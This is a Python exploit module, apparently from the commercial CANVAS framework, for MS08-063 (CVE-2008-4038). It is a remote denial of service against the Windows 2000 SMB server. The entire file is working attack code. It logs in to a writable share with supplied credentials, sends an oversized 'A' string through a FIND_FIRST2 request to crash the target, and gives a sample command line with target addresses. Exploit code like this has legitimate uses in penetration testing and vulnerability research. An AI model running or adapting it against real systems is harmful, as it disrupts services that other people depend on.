#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='Windows SMB Server Overflow'
DESCRIPTION='Windows SMB Server Overflow'

VERSION='1.0'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='10/14/08'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS08-063.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name']='CVE-2008-4038'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4038'
DOCUMENTATION['NOTES']='To exploit this DoS you need access to a share on the target machine with write access.'

PROPERTY={}
PROPERTY['TYPE']='DoS'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000']
PROPERTY['MSADV']='MS08-063'

NOTES="""
Usage:
./exploits/ms08_063/ms08_063.py -t 10.10.10.243 -O user:Administrator -l 1.1.1.1 -d 1 -O share:Shared
"""

CHANGELOG="""
"""

from msrpc import *
import canvasengine

targets={
    0:['Autodetect',0],
    1:['Windows 2000 (DoS)',0x42424242]
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port=139
        self.host=''
        self.shellcode=''
        self.badstring='\0'
        self.version=1
        self.name=NAME        
        self.user=''
        self.password=''
        self.share='C$'
        self.needsNoShellcode=1
        return

    def neededListenerTypes(self):
        return []
    
    def test(self):
        self.getargs()
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('No connection could be established')
            return 0
        return 1
    
    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))        
        self.user=self.getarg('user')
        self.password=self.getarg('password')
        self.share=self.getarg('share')
        return 
    
    def run(self):
        self.getargs()        
        self.setInfo('%s attacking %s:%d (in progress)'%(NAME,self.host,self.port))
        my_smb=SMB(self.host)
        my_smb.port=self.port
        my_smb.username=self.user
        my_smb.password=self.password
        my_smb.connect()
        my_smb.treeconnect(self.share)
        attackstring='A'*0x800
        success,results=smb_findfirst2(my_smb.s,my_smb.tid,my_smb.pid,my_smb.uid,attackstring)
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d - done (success!)'%(NAME,self.host,self.port))
            return 1
        else:
            self.setInfo('%s attacking %s:%d - done (failed)'%(NAME,self.host,self.port))            
        return 1

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i=i+1

    def usage(self):
        print 'Usage: %s -v version -t host\n'%(sys.argv[0])
        self.displayVersions()
        sys.exit(0)

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
